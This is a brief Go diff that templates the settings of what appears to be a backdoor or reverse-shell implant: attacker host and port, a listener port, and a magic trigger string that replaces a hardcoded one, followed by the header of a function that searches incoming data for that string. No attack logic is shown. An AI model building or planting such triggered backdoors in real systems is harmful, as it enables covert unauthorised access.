@@ -15,7 +15,7 @@ const (
 	PORT          = {lport}
 	IP            = "{lhost}"
 	PUERTO        = {listener}
-	especialCadena = "grisiscomebacksayknokknok"
+	especialCadena = "{session_magic}"
 )
 
 func buscarCadenaEspecial(data string) bool {
